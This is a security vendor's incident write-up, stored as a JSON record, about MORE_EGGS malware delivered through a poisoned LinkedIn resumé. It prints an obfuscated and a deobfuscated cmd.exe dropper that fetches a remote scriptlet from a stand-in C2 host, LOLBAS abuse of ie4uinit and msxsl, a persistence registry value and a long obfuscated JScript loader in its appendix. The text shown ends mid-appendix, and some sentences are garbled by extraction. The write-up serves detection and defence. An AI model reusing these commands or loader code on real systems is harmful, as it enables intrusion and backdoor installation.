@@ -1,0 +1,378 @@
+{
+    "id": "3fb1154b-f6ac-4f9e-91c0-4722aad31c02",
+    "created_at": "2023-01-12T15:04:14.297099Z",
+    "updated_at": "2025-03-27T02:16:08.426052Z",
+    "deleted_at": null,
+    "sha1_hash": "1f27707236d78170395f428770f877f5fd224125",
+    "title": "2022-08-25 - MORE_EGGS and Some LinkedIn Resumé Spearphishing",
+    "authors": "",
+    "file_creation_date": "2022-09-01T10:31:08Z",
+    "file_modification_date": "2022-09-01T10:31:08Z",
+    "file_size": 1223986,
+    "plain_text": "# MORE_EGGS and Some LinkedIn Resumé Spearphishing\n\n**expel.com/blog/more-eggs-and-some-linkedin-resume-spearphishing**\n\n#### Security operations |\n18 min read\n\n | Aug 25, 2022\n\n |\nby Kyle Pellett and Andrew Jerry\n\n | Tags:\n MDR,\n\n\nAugust 25, 2022\n\n\n#### The “Great Resignation” has recruiters working overtime scouring LinkedIn resumés for potential candidates. Unfortunately, some of these resumés are posted by bad actors taking advantage of the situation.\n\n With a new twist on the MORE_EGGS family of malware, attackers are throwing their names in the ring by submitting poisoned resumés to job recruiters. The Expel SOC recently spotted a deployment of this technique. The victim’s computer was infected and the malware payload tried to exfiltrate data within a few minutes.\n\n## How we spotted our initial lead\n\n#### So, to be honest, malware sometimes acts so quickly that multiple alerts sound before one of our analysts can start the triage process. As you’d imagine, we’re automatically suspicious when we see multiple alerts fire for the same activity. It tells us that something strange is happening.\n\n In this case, we received seven unique Microsoft Defender for Endpoint alerts within a few seconds for activity that clearly (for reasons explained below) resembled malicious code execution. This tipped our SOC analysts to an attack that was well under way — action to contain the host was needed urgently.\n\n After this type of malware gains initial access — even if partially blocked by existing security controls — the attack can spread quickly and deploy code execution, defense evasion, and command and control techniques (in this case the answer was D — all of the above).\n\n This is why a detection strategy that covers all parts of the MITRE ATT&CK framework is so important. In this case, Defender for Endpoint caught the use of XSL Script Processing first.\n\n Cybersecurity is sometimes a battle of humans vs computers, and humans have the disadvantage with respect to time. A lot can happen in one “computer second,” and tech like the Expel Workbench™ and Ruxie™ help level the field by transforming alert data into intel our SOC analysts can quickly respond to while an attack is under way. (More on how we use Defender’s features to our advantage here.)\n\n Let’s take a look at one of several Microsoft Defender for Endpoint alerts we received, how the Expel Workbench helped guide our analysts to find important information quickly, and how we inferred that this attack was in progress.\n\n\n-----\n\n-----\n\n#### Can you spot the evil here? Here’s what we saw in the recent process activity:\n\n We see regsvr32 attempting to execute 42981.ocx, which is similar to a technique used by malware (such as QBot and Lokibot). This is a pretty good giveaway that some malicious code has been executed; it’s written this 42981.ocx file to disk, and has now called regsvr32 to run whatever code lies within this DLL file. The process arguments of cmd.exe are heavily obfuscated, an indication of an attacker trying to evade detection. One thing that isn’t obfuscated is johndoe[.]com/kbvbskrvf, a likely suspect for a command and control IOC. This alert is looking for discovery activity or “Suspicious sequence of exploration activities.” We see this in the command cmd /v /c nltest /trusted_domains outputting to a text file in a temporary directory, which is consistent with identifying domains trusted by this host — quite unusual if you ask us. msxsl.exe is a deprecated XML parsing tool with a well documented use case for executing code and bypassing application controls — here we see it trying to run an obscurely named text file. We also observe wmic creating the process ie4uinit.exe -basesettings. This is another LOLBAS (living off the land binary, script, or library) like msxsl.exe that can easily execute code because it can execute commands from a specially prepared ie4uinit.inf file.\n\n Okay, so a lot of bad stuff going on…and so far, not a lot of answers to how this happened. At this point, we declared an incident, notified our customer, and sent them remediation actions to contain the host and block communications with johndoe[.]com\n\n (Side note: This is not the real C2 we observed, but in the interest of protecting the anonymity of the user the attackers impersonated, we refer to them as johndoe for this blog.)\n\n## Identifying the root cause\n\n#### The next question we wanted to answer: How did this malware infection get here?\n\n We used the customer’s EDR tool to review the timeline and walk back through the chain of events that ultimately led us to an event involving Outlook.exe.\n```\nOUTLOOK.EXE opened the http link hxxps://www.linkedin[.]com/e/v2?e=-1swgqb-l437ev7bv3&lipi=urn%3Ali%3Apage%3Aemail_email_jobs_new_applicant_01%3Bgo6DX7fyT96rJM8b2IE8Fw%3D%3D&t=plh&ek=email_jobs_new_appli\nHMeqGo9oXk\n\n```\n\n-----\n\n#### e use c c ed o a a e a o a eg t ate se de to a eg t ate do a ; based o t e equested esou ce, t appea s t ey e e seeking a resumé for a job posting. This is interesting for a couple of reasons.\n\n The attackers evaded inbox malspam detection using a legitimate email sender The document is likely expected, based on a job posting created by the targeted user The link in the email also appears legitimate\n\n Unfortunately, our target still fell prey to a malicious phishing document. So what happens if the victim clicks through to download the resumé from LinkedIn?\n\n To find out, we followed the trail and discovered a PDF crafted to present the viewer with an error. The error is actually an attempt to lure the victim to an unsafe site where they can download General-Manager-resumé.docx (the file is presented as a Word document).\n\n Of course, this is suspicious to us because we know what happens. But an everyday user recruiting from LinkedIn has probably seen resumés that aren’t compatible with their software. This seems to be what the attackers are counting on. Notably, the domain johndoe[.]com aligns with what the recruiter expects to see based on the applicant’s name. (It was later discovered that the victim was in fact a recruiter and wasn’t aware of a problem with their host after following this funnel.)\n\n## What happened to the host?\n\n#### So what happens when the user clicks on the .docx link? Well, as it turns out, a bunch of things (before the user is finally presented with a word document). First of all, the file that lands on the victim’s disk is actually a zip archive by the same name 一 General Manager Resume 1.zip. Once the zip is written to disk, we immediately see it create John Doe CV.lnk.\n\n At this point we see a familiar code execution from one of our alerts:\n\n Obfuscated\n```\n\"cmd.exe\" /v /c set \"979113wEX=set\" && call set \"979113gn=%979113wEX:~0,1%\" && (for %p in (c) do @set\n\"979113QCH=%~p\") && !979113gn!et \"979113XI=e\" && !979113gn!!979113XI!t \"979113rKw=$w\" && s!979113XI!t \"979113bCj=i\"\n&& set \"979113FL=a\" && s!979113XI!t \"979113jnI=t\" && !979113gn!et \"979113pHq=d\" && s!979113XI!t \"979113mJ=.\" &&\ns!979113XI!t \"979113MAn=init\" && set \"979113TQ=s!979113bCj!\" && s!979113XI!t \"979113Jq=s!979113XI!tt!979113bCj!ngs\"\n&& s!979113XI!t \"979113Pnd=.!979113bCj!nf\" && set \"979113PN=i!979113XI!u!979113MAn!!979113Pnd!\" && s!979113XI!t\n\"979113ED= = \" && !979113gn!et \"979113AS=s!979113bCj!gnatur!979113XI!!979113ED!\" && s!979113XI!t\n\"979113vY=all!979113mJ!win\" && set \"979113ixY=de\" && s!979113XI!t \"979113Dtp=ch\" && call !979113gn!!979113XI!t\n\"979113YM=C:\\Users\\<Redacted>\\AppData\\Roaming\\M!979113bCj!crosoft\\\" && s!979113XI!t \"979113nT=!979113YM!!979113PN!\"\n\n```\n\n-----\n\n```\n              ( ( [ j ] j\n[!979113ixY!stinationdirs]\" \"F00BE!979113ED!01\" \"[!979113ixY!faultinst!979113vY!dows7]\"\n\"UnRegist!979113XI!rOCXs!979113ED!3DF1\" \"!979113pHq!elfiles!979113XI!F00BE\" \"[3DF1]\"\n\"%11%\\scRo%979113yd%j,NI,%979113RHZ%%979113BCS%%979113BCS%p%979113zL%%979113rf%%979113rf%johndoe.com/kbvbskrvf\" \"\n[F00BE]\" \"ieu%979113GjL%!979113Pnd!\" \"[strings]\" \"979113GjL=!979113MAn!\" \"979113BCS=t\" \"servicename' '\" \"979113RHZ=h\"\n\"979113zL=:\" \"979113rf=/\" \"shorthvcname= \" \"979113FPK=com\" \"979113yd=b\") do @e!979113Dtp!o %~h)>\"!979113nT!\" && set\n\"979113jgm=ie4uinit.exe\" && call copy /Y C:\\windows\\system32\\!979113jgm! \"!979113YM!\" > nul && st!979113FL!rt \"\" /MIN\nwm!979113bCj!c proc!979113XI!ss call cr!979113XI!ate \"!979113YM!!979113jgm! -bas!979113XI!!979113Jq!\"\n\n#### Deobfuscated\n\"cmd.exe\" /v /c (for h in (\"[version]\" \"signature = $windows nt$\" \"[destinationdirs]\" \" 01 = 01\" \"\n[defaultinstall.windows7]\" \"UnRegisterOCXs = 3DF1\" \"delfileseF00BE\" \"[3DF1]\"\n\"11\\scRobj,NI,http://johndoe.com/kbvbskrvf\" \"[F00BE]\" \"ieuinit.inf\" \"[strings]\" \"init=init\" \"t=t\" \"servicename' '\"\n\"h=h\" \":=:\" \"/=/\" \"shorthvcname= \" \"979113FPK=com\" \"b=b\") do @echo ~h)>\"C:\\Users\\\n<Redacted>\\AppData\\Roaming\\Microsoft\\.infieuinit.inf\" && set \"ie4uinit.exe=ie4uinit.exe\" && call copy /Y\nC:\\windows\\system32\\ie4uinit.exe \"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\\" > nul && stirt \"\" /MIN wmic process\ncall create \"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\ie4uinit.exe -basesettings\"\n\n This command accomplishes a few things. It:\n\n points to http://johndoe[.]com/kbvbskrvf, a malicious resource hosted on the C2 domains UnRegisterOCXs to fetch and run the malicious resource using scrobj writes it as the file “ieuinit.inf” and puts it in C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\.infieuinit.inf copies the legitimate ie4uinit.exe from C:\\windows\\system32\\ie4uinit.exe and uses WMIC to create the process in C:\\Users\\ <Redacted>\\AppData\\Roaming\\Microsoft\\ie4uinit.exe\n\n This is indicative of the fileless malware execution technique used by GANDCAB, described here. (Further credit to the BOHOPS description of misuse of .inf files, UnRegisterOCXSection and scrobj.dll.)\n\n Whenever we see legitimate Windows binaries where no vendors have determined the hash for ie4uinit.exe to be malicious, their occurrence outside the normal/expected path raises suspicions. According to VirusTotal, the file isn’t signed, but appears to be copywritten by Microsoft and is a component of Internet Explorer.\n\n Within a millisecond of execution of the obfuscated cmd.exe process, we see the following wmic process.\nwmic process call create \"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\ie4uinit.exe -basesettings\"\n\n```\n\n#### Another signed binary, msxsl.exe, is also placed in the Appdata\\Roaming directory. The attackers now have two signed binaries at their disposal in an unprotected location: C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\msxsl.exe.\n\n Both ieuninit.exe and msxsl.exe were placed in Appdata\\Roaming for later use. All of this happened in seconds ーwhile the victim was waiting for the resumé to load ー and we see one more command before the victim is presented with a Word doc ー the decoy resumé).\n\n The signed binary is in an unusual location ー C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\ie4uinit.exe ー and is using wmic to adjust token privileges to allow the following privileges to the user’s access token:\n Shutdown, Undock, IncreaseWorkingSet, TimeZone.\n\n This was followed by the execution of a script by ie4uinit.exe out of AppData\\Romaing. The following AMSI content was recorded.\n\n See Appendix A:\n\n At first glance, this looks like an obfuscated javascript with function calls containing the following human-readable operations:\n\n return String.fromCharCode return new ActiveXObject return Math.floor(Math.random() * 65536 .writeText .saveToFile {if (typeof WScript === ‘object’) {return true; RegRead\n\n\n-----\n\n#### GetObject .Create\n\n Without completely deobfuscating this, we can guess the intent is to run a function after obfuscating the data with String.fromCharCode. This works by naming hexadecimal values as Unicode values, which are finally converted to characters. Here’s the slightly deobfuscated pretty version:\n\n See Appendix B:\n\n The script then takes the string and writes an ActiveXobject with what’s expected to be a WScript file:\n```\nlgnsyjcm9801.saveToFile(lgnsyjcm4315);\nlgnsyjcm9801.close();\nlgnsyjcm963 = 1;\n} catch (lgnsyjcm265) {\nreturn 0;\n}\nreturn lgnsyjcm963;\n}\nfunction lgnsyjcm400() {\ntry {\nlgnsyjcm0147.lgnsyjcm786;\nreturn true;\n} catch (lgnsyjcm27) {\nif (typeof WScript === \"object\") {\n\n We then see an attempt at some cryptographic function based on the presence of return Math.floor(Math.random() * 65536. Open-source intelligence suggests this function is generating a pseudo-random number either used for C2 traffic encryption or as a GUID to uniquely identify the machine for eventual extortion or ransomware reasons.\n\n There’s also evidence of an intended registry-read event:\nfunction lgnsyjcm206() {\nvar lgnsyjcm681;\nvar lgnsyjcm4718;\ntry {\nlgnsyjcm681 = lgnsyjcm15(lgnsyjcm2656(\"EdT:2)?+6**kP>Yj\", lgnsyjcm8, lgnsyjcm4));\nlgnsyjcm4718 = lgnsyjcm681.RegRead(lgnsyjcm2656(\"rz%I07urKoW0mJVbfPQ=}Kp;]cNjAFcRVlW#ckgw7%I>\n(,I5,dv&KR/,^kH+9*p=/6*dFQ+mC2T|j[,;T)+FE\", lgnsyjcm8, lgnsyjcm4));\nif (!lgnsyjcm4718) {\n\n```\n```\nreturn false;\n}\n\n#### This can be deobfuscated further, but the next event we see on the host is the decoy document being created and executed using wmi:\nScript content: IWshShell3.Environment(\"PROCESS\");\nIWshEnvironment.Item(\"APPDATA\");\n_Stream.Open();\n_Stream.Position(\"0\");\n_Stream.Type(\"2\");\n_Stream.Charset(\"437\");\n_Stream.WriteText(\"╨╧αí▒ß\");\n_Stream.SaveToFile(\"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\6222.doc\");\n\n The user is now presented with a Word document, and nothing appears unusual. Thanks to AMSI content, we can see the 6222.doc file was executed and an ocx file is created.\n\n```\n```\nISWbemServicesEx.Get(\"Win32_Process\");\nISWbemObjectEx._01000001(\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WIN\", \"Unsupported parameter type\n00000001\", \"Unsupported parameter type 00000001\", \"0\");\n\n```\n```\n()\n\n```\n\n-----\n\n```\n          ( );\n_Stream.Type(\"2\");\n_Stream.Charset(\"437\");\n_Stream.WriteText(\"MZÉ\");\n_Stream.SaveToFile(\"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\42981.ocx\")\n\n#### 42981.ocx is now executed by regsrv32.exe, a common tactic used by malicious Word document authors.\nScript Content: Win32_Process.GetObject();\n\n```\n```\nSetPropValue.CommandLine(\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE \"C:\\Users\\\n<Redacted>\\AppData\\Roaming\\Microsoft\\6222.doc\"\");\nSetPropValue.CurrentDirectory(\"Unsupported parameter type 00000001\");\n\n```\n\n#### After executing the .ocx file with regsvr32 we see a registry modification that appears to be a text file in the AppData directory. While we don’t have the contents of the text file, we can assume this is a persistence mechanism.\n```\n\"Registry Key: S-1-12-1-3569878806-1151277312-3324287152-3804517278\\Environment\nValue Name: UserInitMprLogonScript\nValue Data: cscripT -e:jsCript \"\"%APPDATA%\\Microsoft\\46BA2C64FFD9F546.txt\"\"\nValue Type: RegistryValueEntity\"\n\n Regsvr32 also launches the msxsl.exe dropped by the malware to execute the file FC22A0E0F890CC.txt.\n\"Script Content: Win32_Process.GetObject();\nSetPropValue.CommandLine(\"\"C:\\Users\\<Redacted>\\AppData\\Roaming\\Microsoft\\msxsl.exe FC22A0E0F890CC.txt\nFC22A0E0F890CC.txt\"\");\n\n After this we see evidence of discovery commands being executed via wmi by the parent process msxsl.exe. Without the contents of the .txt file we can’t really know for sure what’s happening. But based on OSINT, we can speculate that the .txt file is the MORE_EGGS JScript because it behaves like MORE_EGGS.\n\n If you’re wondering why we didn’t do further analysis … good question. We were hindered a bit without file acquisition and were limited to host timelines. MSDFE did a pretty good job of recording.\nmsxsl.exe executed the WMI query 'SELECT Version FROM CIM_Datafile Where Name = 'C:\\\\windows\\\\notepad.exe''\nmsxsl.exe executed the WMI query 'SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True'\nmsxsl.exe executed the WMI query 'SELECT * FROM Win32_Process'\n\n```\n\n#### Following some system discovery activity, we see HTTP POSTs to the C2 domain webdirectoryuk[.]com. See Appendix C.\n\n The wmi process then executes the cmd.exe command under the victim’s user context to run the nltest command to identify trusted domains and write the output to a text file. This was the final action performed by the malware prior to host containment.\n```\ncmd /v /c nltest /trusted_domains > \"C:\\Users\\<Redacted>\\AppData\\Local\\Temp\\55337.txt\" 2>&1\n\n```\n\n#### Based on open source intelligence research, we suspect 55337.txt is the MORE_EGGS backdoor. This blog explains the capability of this backdoor, which includes command execution “via cmd.exe /C” among other functionality:\n\n Command Description\n\n d&exec Download and execute an executable (.exe or .dll).\n\n more_eggs Delete the current More_eggs and replace it.\n\n Gtfo Uninstall activity.\n\n more_onion Execute a script.\n\n via_c Run a command using “cmd.exe /C”.\n\n Unfortunately, we were unable to acquire any of the files we described. However, given the behaviors performed on the host we were able to tell the story of how a LinkedIn resumé phishing document resulted in a MORE_EGGS backdoor.\n\n Even without acquiring the file, our analysis of the activity aligns with the financially motivated cybercrime gangs FIN6, Evilnum, or the Cobalt Group. It’s difficult to attribute activity to a specific group, but we saw LinkedIn used in 2021 to deliver MORE_EGGS ー with one key difference. The first iteration of threat groups harnessing LinkedIn for this purpose was an inverse of the victim-attacker relationship. Instead of\n\n\n-----\n\n#### ec u te s e pect g esu és, t e 6 g oup as pos g as e p oye s a d se d g a e job o e s to t e ct s o e ed ased o their prior use of LinkedIn, it’s quite possible this is the work of FIN6 or a copycat.\n\n Either way, credit should be given where due. Financially motivated threat actors aren’t playing around and the victim user this article was based around wasn’t aware that downloading a resumés from LinkedIn left a backdoor on their machine.\n\n Summary of attack lifecycle:\n\n Remediation: Initial remediation focused on stopping the bleeding, containing the host, and reimaging the box to a known good image, ensuring no remnants were left over. We also recommended blocking the C2 domain webdirectoryuk[.]com.\n\n Resilience: Even though we detected and reported this incident quickly, the bottom line is that malicious code executed on one of our customer-managed devices on their network. Whenever we can directly point to environment controls to enable defenders or disrupt attackers, we include them in the incident findings report. In this incident we provided the customer with the following resilience actions:\n\n Disrupt attackers:\n\n Phishing education for users, specifically from trusted sources (LinkedIn). Configure Jscript (.js, .jse), Windows Scripting Files (.wsf, .wsh) and HTML for application (.hta) files to open with Notepad.\n By associating these file extensions with Notepad you mitigate common remote code execution techniques. Note that PowerShell files (.ps1) already open by default in Notepad.\n\n Enable Defenders:\n\n Increase visibility into PowerShell activity by taking advantage of logging capabilities. Module and ScriptBlock logging provide greater visibility into potential PowerShell attacks.\n Good: Ensure PowerShell 3.0 (at least) is installed on all Windows systems and enable PowerShell Module logging. Better: Ensure PowerShell 5.0 (at least) is installed on all Windows systems and enable PowerShell ScriptBlock logging and transcription logging. Best: Ensure PowerShell 5.0 (at least) is installed on all Windows systems, enable PowerShell ScriptBlock logging and transcription logging; also make sure Microsoft-Windows-PowerShell%4Operational.evtx is at least 1 GB in size on all systems to aid in an investigation.\n\n### Appendix A\n```\nScript content: function anonymous() { function lgnsyjcm9469(lgnsyjcm2900) {return lgnsyjcm2900.length;}function\nlgnsyjcm262(lgnsyjcm6080){return String.fromCharCode(lgnsyjcm6080);}function lgnsyjcm56(lgnsyjcm458) {var lgnsyjcm62\n= [];var lgnsyjcm356 = [];var lgnsyjcm144 = \"\";var lgnsyjcm1495;var lgnsyjcm020;var lgnsyjcm4110 = 0;lgnsyjcm62[0x80]\n\n```\n\n-----\n\n```\n     ; g yj [ ] ; g yj [ ] ; g yj [ ] ; g yj [ ]\n0x00E4;lgnsyjcm62[0x85] = 0x00E0;lgnsyjcm62[0x86] = 0x00E5;lgnsyjcm62[0x87] = 0x00E7;lgnsyjcm62[0x88] =\n0x00EA;lgnsyjcm62[0x89] = 0x00EB;lgnsyjcm62[0x8A] = 0x00E8;lgnsyjcm62[0x8B] = 0x00EF;lgnsyjcm62[0x8C] =\n0x00EE;lgnsyjcm62[0x8D] = 0x00EC;lgnsyjcm62[0x8E] = 0x00C4;lgnsyjcm62[0x8F] = 0x00C5;lgnsyjcm62[0x90] =\n0x00C9;lgnsyjcm62[0x91] = 0x00E6;lgnsyjcm62[0x92] = 0x00C6;lgnsyjcm62[0x93] = 0x00F4;lgnsyjcm62[0x94] =\n0x00F6;lgnsyjcm62[0x95] = 0x00F2;lgnsyjcm62[0x96] = 0x00FB;lgnsyjcm62[0x97] = 0x00F9;lgnsyjcm62[0x98] =\n0x00FF;lgnsyjcm62[0x99] = 0x00D6;lgnsyjcm62[0x9A] = 0x00DC;lgnsyjcm62[0x9B] = 0x00A2;lgnsyjcm62[0x9C] =\n0x00A3;lgnsyjcm62[0x9D] = 0x00A5;lgnsyjcm62[0x9E] = 0x20A7;lgnsyjcm62[0x9F] = 0x0192;lgnsyjcm62[0xA0] =\n0x00E1;lgnsyjcm62[0xA1] = 0x00ED;lgnsyjcm62[0xA2] = 0x00F3;lgnsyjcm62[0xA3] = 0x00FA;lgnsyjcm62[0xA4] =\n0x00F1;lgnsyjcm62[0xA5] = 0x00D1;lgnsyjcm62[0xA6] = 0x00AA;lgnsyjcm62[0xA7] = 0x00BA;lgnsyjcm62[0xA8] =\n0x00BF;lgnsyjcm62[0xA9] = 0x2310;lgnsyjcm62[0xAA] = 0x00AC;lgnsyjcm62[0xAB] = 0x00BD;lgnsyjcm62[0xAC] =\n0x00BC;lgnsyjcm62[0xAD] = 0x00A1;lgnsyjcm62[0xAE] = 0x00AB;lgnsyjcm62[0xAF] = 0x00BB;lgnsyjcm62[0xB0] =\n0x2591;lgnsyjcm62[0xB1] = 0x2592;lgnsyjcm62[0xB2] = 0x2593;lgnsyjcm62[0xB3] = 0x2502;lgnsyjcm62[0xB4] =\n0x2524;lgnsyjcm62[0xB5] = 0x2561;lgnsyjcm62[0xB6] = 0x2562;lgnsyjcm62[0xB7] = 0x2556;lgnsyjcm62[0xB8] =\n0x2555;lgnsyjcm62[0xB9] = 0x2563;lgnsyjcm62[0xBA] = 0x2551;lgnsyjcm62[0xBB] = 0x2557;lgnsyjcm62[0xBC] =\n0x255D;lgnsyjcm62[0xBD] = 0x255C;lgnsyjcm62[0xBE] = 0x255B;lgnsyjcm62[0xBF] = 0x2510;lgnsyjcm62[0xC0] =\n0x2514;lgnsyjcm62[0xC1] = 0x2534;lgnsyjcm62[0xC2] = 0x252C;lgnsyjcm62[0xC3] = 0x251C;lgnsyjcm62[0xC4] =\n0x2500;lgnsyjcm62[0xC5] = 0x253C;lgnsyjcm62[0xC6] = 0x255E;lgnsyjcm62[0xC7] = 0x255F;lgnsyjcm62[0xC8] =\n0x255A;lgnsyjcm62[0xC9] = 0x2554;lgnsyjcm62[0xCA] = 0x2569;lgnsyjcm62[0xCB] = 0x2566;lgnsyjcm62[0xCC] =\n0x2560;lgnsyjcm62[0xCD] = 0x2550;lgnsyjcm62[0xCE] = 0x256C;lgnsyjcm62[0xCF] = 0x2567;lgnsyjcm62[0xD0] =\n0x2568;lgnsyjcm62[0xD1] = 0x2564;lgnsyjcm62[0xD2] = 0x2565;lgnsyjcm62[0xD3] = 0x2559;lgnsyjcm62[0xD4] =\n0x2558;lgnsyjcm62[0xD5] = 0x2552;lgnsyjcm62[0xD6] = 0x2553;lgnsyjcm62[0xD7] = 0x256B;lgnsyjcm62[0xD8] =\n0x256A;lgnsyjcm62[0xD9] = 0x2518;lgnsyjcm62[0xDA] = 0x250C;lgnsyjcm62[0xDB] = 0x2588;lgnsyjcm62[0xDC] =\n0x2584;lgnsyjcm62[0xDD] = 0x258C;lgnsyjcm62[0xDE] = 0x2590;lgnsyjcm62[0xDF] = 0x2580;lgnsyjcm62[0xE0] =\n0x03B1;lgnsyjcm62[0xE1] = 0x00DF;lgnsyjcm62[0xE2] = 0x0393;lgnsyjcm62[0xE3] = 0x03C0;lgnsyjcm62[0xE4] =\n0x03A3;lgnsyjcm62[0xE5] = 0x03C3;lgnsyjcm62[0xE6] = 0x00B5;lgnsyjcm62[0xE7] = 0x03C4;lgnsyjcm62[0xE8] =\n0x03A6;lgnsyjcm62[0xE9] = 0x0398;lgnsyjcm62[0xEA] = 0x03A9;lgnsyjcm62[0xEB] = 0x03B4;lgnsyjcm62[0xEC] =\n0x221E;lgnsyjcm62[0xED] = 0x03C6;lgnsyjcm62[0xEE] = 0x03B5;lgnsyjcm62[0xEF] = 0x2229;lgnsyjcm62[0xF0] =\n0x2261;lgnsyjcm62[0xF1] = 0x00B1;lgnsyjcm62[0xF2] = 0x2265;lgnsyjcm62[0xF3] = 0x2264;lgnsyjcm62[0xF4] =\n0x2320;lgnsyjcm62[0xF5] = 0x2321;lgnsyjcm62[0xF6] = 0x00F7;lgnsyjcm62[0xF7] = 0x2248;lgnsyjcm62[0xF8] =\n0x00B0;lgnsyjcm62[0xF9] = 0x2219;lgnsyjcm62[0xFA] = 0x00B7;lgnsyjcm62[0xFB] = 0x221A;lgnsyjcm62[0xFC] =\n0x207F;lgnsyjcm62[0xFD] = 0x00B2;lgnsyjcm62[0xFE] = 0x25A0;lgnsyjcm62[0xFF] = 0x00A0;do {lgnsyjcm1495 =\nlgnsyjcm458[lgnsyjcm4110];if (lgnsyjcm1495 < 128) {lgnsyjcm020 = lgnsyjcm1495;}else {lgnsyjcm020 =\nlgnsyjcm62[lgnsyjcm1495];}lgnsyjcm356.push(lgnsyjcm262(lgnsyjcm020));lgnsyjcm4110 += 1;} while (lgnsyjcm4110 <\nlgnsyjcm9469(lgnsyjcm458));lgnsyjcm144 = lgnsyjcm356.join(\"\");return lgnsyjcm144;}function lgnsyjcm15(lgnsyjcm287)\n{return new ActiveXObject(lgnsyjcm287);}function lgnsyjcm7522() {return Math.floor(Math.random() * 65536);}function\nlgnsyjcm4677(lgnsyjcm387, lgnsyjcm4315, lgnsyjcm7403, lgnsyjcm1632, lgnsyjcm4299){var lgnsyjcm963;try {var\nlgnsyjcm5310 = lgnsyjcm598(lgnsyjcm387);var lgnsyjcm081 = lgnsyjcm894(lgnsyjcm5310, lgnsyjcm7403,\nlgnsyjcm1632);lgnsyjcm5310 = 0;if (lgnsyjcm4299 === 1 && lgnsyjcm081[0] !== 0x4D && lgnsyjcm081[1] !== 0x5a){return\n0;}var lgnsyjcm9801 = lgnsyjcm15(lgnsyjcm2656(lgnsyjcm28, lgnsyjcm8,\nlgnsyjcm4));lgnsyjcm9801.open();lgnsyjcm9801.position = 0;lgnsyjcm9801.type = 2;lgnsyjcm9801.charset =\n437;lgnsyjcm9801.writeText(lgnsyjcm56(lgnsyjcm081));lgnsyjcm081 =\n0;lgnsyjcm9801.saveToFile(lgnsyjcm4315);lgnsyjcm9801.close();lgnsyjcm963 = 1;} catch (lgnsyjcm265) {return 0;}return\nlgnsyjcm963;}function lgnsyjcm400() {try {lgnsyjcm0147.lgnsyjcm786;return true;} catch(lgnsyjcm27) {if (typeof\nWScript === 'object') {return true;}lgnsyjcm481();}}function lgnsyjcm206(){var lgnsyjcm681;var\nlgnsyjcm4718;try{lgnsyjcm681 = lgnsyjcm15(lgnsyjcm2656('EdT:2)?+6**kP>Yj', lgnsyjcm8, lgnsyjcm4));lgnsyjcm4718 =\nlgnsyjcm681.RegRead(lgnsyjcm2656('rz%I07urKoW0mJVbfPQ=}Kp;]cNjAFcRVlW#ckgw7%I>\n(,I5,dv&KR/,^kH+9*p=/6*dFQ+mC2T|j[,;T)+FE', lgnsyjcm8, lgnsyjcm4));if (!lgnsyjcm4718) {return false;}return\nlgnsyjcm4718;} catch(lgnsyjcm0598){return false;}}function lgnsyjcm481(){var lgnsyjcm9032 = \"\\\\\";var lgnsyjcm4797;var\nlgnsyjcm867;var lgnsyjcm337 = \"\";var lgnsyjcm118 = '\"';var lgnsyjcm449 = \"\";try {lgnsyjcm4797 =\nlgnsyjcm15(lgnsyjcm2656(lgnsyjcm737, lgnsyjcm8, lgnsyjcm4));lgnsyjcm867 =\nlgnsyjcm4797.environment(lgnsyjcm2656(lgnsyjcm70, lgnsyjcm8, lgnsyjcm4));lgnsyjcm337 =\nlgnsyjcm867(lgnsyjcm2656(lgnsyjcm8727, lgnsyjcm8, lgnsyjcm4));if (lgnsyjcm337 != \"\") {lgnsyjcm337 = lgnsyjcm337 +\nlgnsyjcm9032 + lgnsyjcm2656(lgnsyjcm3517, lgnsyjcm8, lgnsyjcm4) + lgnsyjcm9032;}} catch (lgnsyjcm087) {lgnsyjcm337 =\n\"\";}var lgnsyjcm7220;lgnsyjcm7220 = lgnsyjcm337 + lgnsyjcm7522() + lgnsyjcm2656(lgnsyjcm807, lgnsyjcm8, lgnsyjcm4);if\n(lgnsyjcm4677(lgnsyjcm3700, lgnsyjcm7220, lgnsyjcm8, lgnsyjcm4, 0) === 1){var lgnsyjcm012 = lgnsyjcm118 +\nlgnsyjcm7220 + lgnsyjcm118;var lgnsyjcm24 = 0;try {var lgnsyjcm554 =\nGetObject(lgnsyjcm2656('Zu%Fr>p+*kGN{~bq\"/E>+Nw6z/OE/aRQ9O<NPg&]IU/7|PH5p0Wl~f5[}sI&<YL_Sn&Gl', lgnsyjcm8,\nlgnsyjcm4));var lgnsyjcm0750 = lgnsyjcm206();if (lgnsyjcm0750) {var lgnsyjcm377 =\nlgnsyjcm554.Get(lgnsyjcm2656('_t&yfpEx4[HY]Vhr', lgnsyjcm8, lgnsyjcm4)).Create(lgnsyjcm0750 + \" \" + lgnsyjcm012,\nnull, null, 0);if (lgnsyjcm377 !== 0){lgnsyjcm8568;}}} catch(ew3) {try{lgnsyjcm4797.Run(lgnsyjcm012, 1, 0);lgnsyjcm24\n= 1;} catch (lgnsyjcm364) {lgnsyjcm24 = 0;}}lgnsyjcm012 = 0;}lgnsyjcm3700 = 0;lgnsyjcm7220 = 0;lgnsyjcm337 =\nlgnsyjcm337 + lgnsyjcm7522() + lgnsyjcm2656(lgnsyjcm284, lgnsyjcm8, lgnsyjcm4);if (lgnsyjcm4677(lgnsyjcm20,\nlgnsyjcm337, lgnsyjcm8, lgnsyjcm4, 1) === 1){lgnsyjcm20 = \"\";var lgnsyjcm348 = 0;lgnsyjcm449 =\nlgnsyjcm2656(lgnsyjcm743, lgnsyjcm8, lgnsyjcm4) + lgnsyjcm118 + lgnsyjcm337 + lgnsyjcm118;try {var lgnsyjcm897 =\nGetObject(lgnsyjcm2656('Zu%Fr>p+*kGN{~bq\"/E>+Nw6z/OE/aRQ9O<NPg&]IU/7|PH5p0Wl~f5[}sI&<YL_Sn&Gl', lgnsyjcm8,\nlgnsyjcm4));var lgnsyjcm857 = lgnsyjcm897.Get(lgnsyjcm2656('_t&yfpEx4[HY]Vhr', lgnsyjcm8,\nlgnsyjcm4)).Create(lgnsyjcm449, null, null, 